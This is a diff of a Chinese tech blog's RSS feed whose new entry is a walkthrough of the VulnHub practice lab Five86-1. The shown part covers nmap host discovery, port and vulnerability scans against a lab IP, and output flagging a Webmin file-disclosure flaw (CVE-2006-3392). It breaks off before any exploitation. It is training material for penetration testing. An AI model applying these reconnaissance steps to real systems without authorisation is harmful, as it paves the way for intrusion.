@@ -1,4 +1,1138 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ke1thLi 的技术笔记</title><link>https://ke1thli.github.io/</link><description>Recent content on Ke1thLi 的技术笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Wed, 07 Oct 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://ke1thli.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Necromancer Vulunhub靶场复现</title><link>https://ke1thli.github.io/p/necromancer-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</link><pubDate>Wed, 07 Oct 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/necromancer-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</guid><description>&lt;h1 id="necromancer-vulnhub靶场复现"&gt;Necromancer VulnHub靶场复现
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ke1thLi 的技术笔记</title><link>https://ke1thli.github.io/</link><description>Recent content on Ke1thLi 的技术笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sun, 11 Oct 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://ke1thli.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Five86-1 Vulunhub靶场复现</title><link>https://ke1thli.github.io/p/five86-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</link><pubDate>Sun, 11 Oct 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/five86-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</guid><description>&lt;h1 id="five86-1-vulnhub靶场复现"&gt;Five86-1 VulnHub靶场复现
+&lt;/h1&gt;&lt;h1 id="靶场复现"&gt;靶场复现
+&lt;/h1&gt;&lt;p&gt;靶场地址 &lt;a class="link" href="https://www.vulnhub.com/entry/five86-1%2C417/" target="_blank" rel="noopener"
+ &gt;https://www.vulnhub.com/entry/five86-1%2C417/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;介绍如下&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-markdown" data-lang="markdown"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="gu"&gt;## Description
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Five86-1 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;The ultimate goal of this challenge is to get root and to read the one and only flag.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;For beginners, Google can be of great assistance, but you can always tweet me at &lt;span class="ni"&gt;@DCAU7&lt;/span&gt; for assistance to get you going again. But take note: I won&amp;#39;t give you the answer, instead, I&amp;#39;ll give you an idea about how to move forward.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="gu"&gt;## Technical Information
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Five86-1 is a VirtualBox VM built on Debian 64 bit, but there shouldn&amp;#39;t be any issues running it on most PCs.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Five86-1 has been tested successfully on VMWare Player, but if there are any issues running this VM in VMware, have a read through of [&lt;span class="nt"&gt;this&lt;/span&gt;](&lt;span class="na"&gt;http://www.five86.com/vmware.html&lt;/span&gt;).
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Installation is simple - download it, unzip it, and then import it into VirtualBox or VMWare and away you go.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="gu"&gt;## Important
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;While there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;In saying that, there shouldn&amp;#39;t be any problems, but I feel the need to throw this out there just in case.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="gu"&gt;## Credits
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;A big thanks goes out to the members of &lt;span class="ni"&gt;@m0tl3ycr3w&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="gu"&gt;## Contact
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;I&amp;#39;m also very interested in hearing how people go about solving these challenges, so if you&amp;#39;re up for writing a walkthrough, please do so and send me a link, or alternatively, follow me on Twitter, and DM me (you can unfollow after you&amp;#39;ve DM&amp;#39;d me if you&amp;#39;d prefer).
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;I can be contacted via Twitter - &lt;span class="ni"&gt;@Five86_x&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="靶场部署"&gt;靶场部署
+&lt;/h3&gt;&lt;p&gt;默认是桥接，改为nat&lt;/p&gt;
+&lt;h2 id="信息收集"&gt;信息收集
+&lt;/h2&gt;&lt;h3 id="主机发现"&gt;主机发现
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo nmap -sn 10.10.10.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;获取靶机ip为 10.10.10.103&lt;/p&gt;
+&lt;h3 id="端口扫描与漏洞探测"&gt;端口扫描与漏洞探测
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo nmap -sS -sV -O -sC -p- --min-rate &lt;span class="m"&gt;5000&lt;/span&gt; 10.10.10.103
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Starting Nmap 7.99 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2026-10-08 04:05 -0400
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; 10.10.10.103
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.00059s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Not shown: &lt;span class="m"&gt;65532&lt;/span&gt; closed tcp ports &lt;span class="o"&gt;(&lt;/span&gt;reset&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PORT STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 &lt;span class="o"&gt;(&lt;/span&gt;protocol 2.0&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;2048&lt;/span&gt; 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;256&lt;/span&gt; 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ &lt;span class="m"&gt;256&lt;/span&gt; ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 &lt;span class="o"&gt;(&lt;/span&gt;ED25519&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;80/tcp open http Apache httpd 2.4.38 &lt;span class="o"&gt;((&lt;/span&gt;Debian&lt;span class="o"&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; http-robots.txt: &lt;span class="m"&gt;1&lt;/span&gt; disallowed entry
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_/ona
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.38 &lt;span class="o"&gt;(&lt;/span&gt;Debian&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class="s1"&gt;&amp;#39;t have a title (text/html).
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;10000/tcp open http MiniServ 1.920 (Webmin httpd)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;|_http-title: Site doesn&amp;#39;&lt;/span&gt;t have a title &lt;span class="o"&gt;(&lt;/span&gt;text/html&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;Charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;iso-8859-1&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;MAC Address: 00:0C:29:7A:0B:AF &lt;span class="o"&gt;(&lt;/span&gt;VMware&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Device type: general purpose
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Running: Linux 3.X&lt;span class="p"&gt;|&lt;/span&gt;4.X
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;OS details: Linux 3.2 - 4.14
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Network Distance: &lt;span class="m"&gt;1&lt;/span&gt; hop
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Service Info: OS: Linux&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in 41.17 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;table&gt;
+ &lt;thead&gt;
+ &lt;tr&gt;
+ &lt;th&gt;端口&lt;/th&gt;
+ &lt;th&gt;服务&lt;/th&gt;
+ &lt;th&gt;标题/版本&lt;/th&gt;
+ &lt;th&gt;备注&lt;/th&gt;
+ &lt;/tr&gt;
+ &lt;/thead&gt;
+ &lt;tbody&gt;
+ &lt;tr&gt;
+ &lt;td&gt;22/tcp&lt;/td&gt;
+ &lt;td&gt;SSH&lt;/td&gt;
+ &lt;td&gt;OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)&lt;/td&gt;
+ &lt;td&gt;登录入口，远程管理；存在 RSA / ECDSA / ED25519 host key&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;80/tcp&lt;/td&gt;
+ &lt;td&gt;HTTP&lt;/td&gt;
+ &lt;td&gt;Apache httpd 2.4.38 ((Debian))&lt;/td&gt;
+ &lt;td&gt;Web 入口；&lt;code&gt;robots.txt&lt;/code&gt; 泄露 &lt;code&gt;Disallowed entry: /ona&lt;/code&gt;；待目录/参数枚举&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;10000/tcp&lt;/td&gt;
+ &lt;td&gt;HTTP&lt;/td&gt;
+ &lt;td&gt;MiniServ 1.920 (Webmin httpd)&lt;/td&gt;
+ &lt;td&gt;Webmin 管理入口；无标题，Charset=iso-8859-1；待版本/登录/漏洞枚举&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;nmap漏洞脚本探测&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo nmap --script&lt;span class="o"&gt;=&lt;/span&gt;vuln -p 22,80,10000 10.10.10.103 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Starting Nmap 7.99 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2026-10-08 04:10 -0400
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Stats: 0:00:31 elapsed&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; hosts completed &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; up&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;1&lt;/span&gt; undergoing Script Scan
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;NSE Timing: About 99.66% &lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; ETC: 04:10 &lt;span class="o"&gt;(&lt;/span&gt;0:00:00 remaining&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; 10.10.10.103
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.00072s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PORT STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;22/tcp open ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;80/tcp open http
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_http-csrf: Couldn&lt;span class="s1"&gt;&amp;#39;t find any CSRF vulnerabilities.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;|_http-dombased-xss: Couldn&amp;#39;&lt;/span&gt;t find any DOM based XSS.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_http-stored-xss: Couldn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t find any stored XSS vulnerabilities.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; http-enum: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; /robots.txt: Robots file
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ /reports/: Potentially interesting folder &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;401&lt;/span&gt; Unauthorized&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;10000/tcp open snet-sensor-mgmt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; http-vuln-cve2006-3392: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; VULNERABLE:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; Webmin File Disclosure
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; State: VULNERABLE &lt;span class="o"&gt;(&lt;/span&gt;Exploitable&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; IDs: CVE:CVE-2006-3392
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; Webmin before 1.290 and Usermin before 1.220 calls the simplify_path &lt;span class="k"&gt;function&lt;/span&gt; before decoding HTML.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; This allows arbitrary files to be read, without requiring authentication, using &lt;span class="s2"&gt;&amp;#34;..%01&amp;#34;&lt;/span&gt; sequences
